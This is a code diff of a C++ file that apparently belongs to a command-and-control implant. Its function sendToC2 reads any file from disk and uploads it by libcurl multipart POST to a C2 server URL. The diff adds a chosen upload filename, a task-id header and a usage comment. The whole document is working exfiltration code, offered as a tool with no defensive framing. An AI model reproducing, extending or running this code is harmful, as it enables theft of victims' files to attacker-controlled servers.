@@ -7,9 +7,15 @@
 
 using namespace std;
 
-
+/*
+* example use case: sendToC2(path, url, filename) where path is the path to the file(include the filename), url is the url 
+* with format ip:port/endpoint, filename being the file name C2 going to recive after calling get file name in python code
+*/
 //https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
-void sendToC2(string path, string url) {
+void sendToC2(string path, string url, string filename, string taskid) {
+	struct curl_slist* headers = NULL;
+	string s = "id:" + taskid;
+	headers = curl_slist_append(headers, s.c_str());
 	std::string contents;
 	std::ifstream in(path, std::ios::in | std::ios::binary);
 	if (in)
@@ -32,13 +38,14 @@ void sendToC2(string path, string url) {
 		CURLFORM_END);
 	curl_formadd(&formpost, &lastptr,
 		CURLFORM_COPYNAME, "file",
-		CURLFORM_BUFFER, "doge.png",
+		CURLFORM_BUFFER, filename.c_str(),
 		CURLFORM_BUFFERPTR, contents.data(),
 		CURLFORM_BUFFERLENGTH, contents.size(),
 		CURLFORM_END);
 	curl = curl_easy_init();
 	if (curl){
-		curl_easy_setopt(curl, CURLOPT_URL, url);
+		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+		curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
 		curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK)
@@ -49,9 +56,12 @@ void sendToC2(string path, string url) {
 	}
 }
 
+
+
 int main(int argc, char* argv[]) {
 	string path = argv[1];
 	string url = argv[2];
-	sendToC2(path, url);
+	string filename = argv[3];
+	sendToC2(path, url, filename, "1");
 }
 
